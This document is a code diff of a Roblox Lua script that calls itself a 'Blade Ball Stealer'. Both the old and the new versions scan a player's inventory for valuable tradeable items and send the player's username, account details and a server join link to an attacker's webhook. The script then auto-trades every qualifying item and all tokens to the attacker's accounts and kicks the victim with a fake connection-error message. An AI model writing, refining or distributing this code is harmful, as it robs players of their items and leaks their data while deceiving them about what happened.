@@ -2,193 +2,152 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
-local itemsToSend = {}
-local categories = {"Sword", "Emote", "Explosion"}
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
-local PlayerGui = plr.PlayerGui
-local tradeGui = PlayerGui.Trade
-local inTrade = false
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
 local users = _G.Usernames or {}
-local min_rap = _G.min_rap or 100
-local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 local auth_token = _G.AuthToken or "" 
-_G.LastMessageID = nil
+local min_rap = _G.min_rap or 100
 
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
 
+-- Detection précise des Tokens Blade Ball
 local function getTokens()
     local amount = 0
-    pcall(function() amount = plr.leaderstats.Coins.Value end)
+    pcall(function()
+        if plr:FindFirstChild("leaderstats") and plr.leaderstats:FindFirstChild("Coins") then
+            amount = plr.leaderstats.Coins.Value
+        elseif plr:FindFirstChild("Data") and plr.Data:FindFirstChild("Coins") then
+            amount = plr.Data.Coins.Value
+        else
+            local coinText = plr.PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
+            amount = tonumber(coinText) or 0
+        end
+    end)
     return amount
 end
 
-local function formatNumber(number)
-    if number == nil then return "0" end
-    local suffixes = {"", "k", "M", "B", "T"}
-    local suffixIndex = 1
-    while number >= 1000 and suffixIndex < #suffixes do
-        number = number / 1000
-        suffixIndex = suffixIndex + 1
-    end
-    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
+local function formatNumber(n)
+    if not n then return "0" end
+    local s = {"", "k", "M", "B", "T"}
+    local i = 1
+    while n >= 1000 and i < #s do n = n / 1000 i = i + 1 end
+    return (i == 1) and tostring(math.floor(n)) or string.format("%.1f%s", n, s[i])
 end
 
-local function PostToCloudflare(data, messageID)
-    data["auth_token"] = auth_token
-    data["victim_name"] = plr.Name
-    data["messageID"] = messageID
-    
-    local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..plr.UserId.."&size=150x150&format=Png&isCircular=false"
-    local sT, resT = pcall(function() return game:HttpGet(thumbApi) end)
-    if sT then 
-        local decoded = HttpService:JSONDecode(resT)
-        data["victim_avatar"] = decoded.data[1].imageUrl 
-    end
-    
-    local success, res = pcall(function()
-        return httpRequest({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-    
-    if success and not messageID then
-        local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
-        if ok then return decoded.id end
-    end
-end
-
-local function getFormattedList(list)
-    local grouped = {}
-    for _, item in ipairs(list) do
-        grouped[item.Name] = grouped[item.Name] or {Name = item.Name, Count = 0, TotalRAP = 0}
-        grouped[item.Name].Count = grouped[item.Name].Count + 1
-        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-    end
-    local groupedList = {}
-    for _, group in pairs(grouped) do table.insert(groupedList, group) end
-    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
-
-    local tokenAmount = getTokens()
-    local text = string.format("🪙 **Tokens: %s**\n\n", formatNumber(tokenAmount))
-    
-    for _, group in ipairs(groupedList) do
-        text = text .. string.format("- %s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
-    end
-    return text
-end
-
-local function SendJoinMessage(list)
-    local itemText = getFormattedList(list)
-    local invPing = (ping == "Yes") and "||​|| @everyone" or ""
-    local totalRAPVal = 0
-    for _, v in ipairs(list) do totalRAPVal = totalRAPVal + v.RAP end
-
-    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')"
-
-    local data = {
-        ["content"] = invPing,
-        ["embeds"] = {{
-            ["title"] = "🟣 New Hit Detected 🎯",
-            ["description"] = "Victim found! Click the black bar below to reveal the join command.",
-            ["color"] = 8323327,
-            ["fields"] = {
-                {name = "Victim Username 🤖:", value = "`" .. plr.Name .. "`", inline = true},
-                {name = "Server ID 🆔:", value = "`" .. game.JobId .. "`", inline = true},
-                {name = "Join Command (Hidden) 💻:", value = "||```lua\n" .. joinCode .. "\n```||", inline = false},
-                {name = "Item List 📝:", value = #itemText > 1000 and string.sub(itemText, 1, 1000) .. "..." or itemText},
-                {name = "Summary 💰:", value = "**Total RAP:** " .. formatNumber(totalRAPVal)}
-            },
-            ["footer"] = {["text"] = "Blade Ball Stealer by Eblack"}
-        }}
-    }
-    _G.LastMessageID = PostToCloudflare(data)
-end
-
--- Update Embed to Red on Left
-Players.PlayerRemoving:Connect(function(player)
-    if player == plr and _G.LastMessageID then
-        local data = {
-            ["content"] = "❌ **STATUS UPDATE**",
-            ["embeds"] = {{
-                ["title"] = "🔴 VICTIM LEFT 🔴",
-                ["description"] = "The victim has left the server.",
-                ["color"] = 16711680,
-                ["fields"] = {
-                    {name = "Victim:", value = "`" .. plr.Name .. "`", inline = true},
-                    {name = "Status:", value = "🔴 OFFLINE", inline = true}
-                }
-            }}
-        }
-        PostToCloudflare(data, _G.LastMessageID)
-    end
-end)
-
--- Original RAP Logic
+-- Scan de l'inventaire Blade Ball
+local itemsToSend = {}
+local totalRAP = 0
 local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
-for _, category in ipairs(categories) do
+
+for _, cat in ipairs({"Sword", "Emote", "Explosion"}) do
     local catMap = {}
-    if rapData[category] then
-        for k, v in pairs(rapData[category]) do
+    if rapData[cat] then
+        for k, v in pairs(rapData[cat]) do
             local s, d = pcall(function() return HttpService:JSONDecode(k) end)
             if s then for _, p in ipairs(d) do if p[1] == "Name" then catMap[p[2]] = v end end end
         end
     end
-    for itemId, itemInfo in pairs(clientInventory[category]) do
-        if not itemInfo.TradeLock then
-            local rap = catMap[itemInfo.Name] or 0
+    for id, info in pairs(clientInventory[cat]) do
+        if not info.TradeLock then
+            local rap = catMap[info.Name] or 0
             if rap >= min_rap then
-                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
+                totalRAP = totalRAP + rap
+                table.insert(itemsToSend, {Name = info.Name, RAP = rap, ID = id, Type = cat})
             end
         end
     end
 end
 
--- Start Script
+-- Envoi du Hit avec le style de ton image
 if #itemsToSend > 0 then
-    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
-    SendJoinMessage(itemsToSend)
+    table.sort(itemsToSend, function(a,b) return a.RAP > b.RAP end)
+    
+    local itemSummary = "🪙 Tokens: " .. formatNumber(getTokens()) .. "\n\n"
+    for i, item in ipairs(itemsToSend) do
+        if i > 12 then itemSummary = itemSummary .. "...and more" break end
+        itemSummary = itemSummary .. item.Name .. " (x1): " .. formatNumber(item.RAP) .. " RAP\n"
+    end
 
-    local function doTrade(joinedUser)
-        local tokenToTrade = getTokens()
+    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '"..game.JobId.."')"
+    local directJoin = "https://www.roblox.com/games/13772394625?jobId="..game.JobId
+
+    local data = {
+        ["auth_token"] = auth_token,
+        ["content"] = (_G.pingEveryone == "Yes" and "||​|| @everyone" or "") .. "\n`" .. joinCode .. "`",
+        ["embeds"] = {{
+            ["title"] = "📁 Pending Hit ... | ⚔️ Blade Ball Stealer",
+            ["color"] = 16763904, -- Couleur Or/Jaune
+            ["fields"] = {
+                {
+                    ["name"] = "ℹ️ Player info:",
+                    ["value"] = "```" ..
+                        "\n🆔 Username      : " .. plr.Name ..
+                        "\n👤 Display Name  : " .. plr.DisplayName ..
+                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
+                        "\n⚡ Executor      : " .. executor ..
+                        "\n📩 Receiver      : " .. (users[1] or "None") ..
+                        "\n🎮 Server        : " .. #Players:GetPlayers() .. "/15" ..
+                        "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🎯 Inventory:",
+                    ["value"] = "```" ..
+                        "\n💰 Total Value: " .. formatNumber(totalRAP) .. " RAP" ..
+                        "\n\n" .. itemSummary ..
+                        "```",
+                    ["inline"] = false
+                },
+                {["name"] = "🔗 Join Server", ["value"] = "[Click to join game]("..directJoin..")", ["inline"] = true},
+                {["name"] = "📜 Full Inventory", ["value"] = "[Click to show](https://www.roblox.com/users/"..plr.UserId.."/inventory)", ["inline"] = true}
+            },
+            ["footer"] = {["text"] = "by Eblack • " .. os.date("%B %d, %Y")},
+            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"}
+        }}
+    }
+
+    httpRequest({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+
+    -- Logique de Trade automatique
+    local function doTrade(target)
+        local tokenAmt = getTokens()
         while #itemsToSend > 0 do
-            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(joinedUser)) end)
-            repeat task.wait(0.5) until tradeGui.Enabled
-            local count = 0
-            while #itemsToSend > 0 and count < 100 do
+            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(target)) end)
+            repeat task.wait(0.5) until plr.PlayerGui.Trade.Enabled
+            
+            local batch = 0
+            while #itemsToSend > 0 and batch < 100 do
                 local item = table.remove(itemsToSend, 1)
-                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
-                count = count + 1
+                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.Type, item.ID)
+                batch = batch + 1
             end
-            if tokenToTrade > 0 then
-                pcall(function()
-                    netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokenToTrade)
-                    tokenToTrade = 0
-                end)
+            
+            if tokenAmt > 0 then
+                pcall(function() netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokenAmt) tokenAmt = 0 end)
             end
+            
             netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
             netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
-            repeat task.wait(0.2) until not tradeGui.Enabled
+            repeat task.wait(0.2) until not plr.PlayerGui.Trade.Enabled
         end
-        
-        -- FAKE DISCONNECT MESSAGE
         task.wait(1)
         plr:kick("Please check your internet connection and try again.\n(Error Code: 277)")
     end
 
+    -- Chercher le receveur sur le serveur
     for _, p in ipairs(Players:GetPlayers()) do
         if table.find(users, p.Name) then doTrade(p.Name) break end
     end
-    Players.PlayerAdded:Connect(function(player)
-        if table.find(users, player.Name) then doTrade(player.Name) end
-    end)
 end
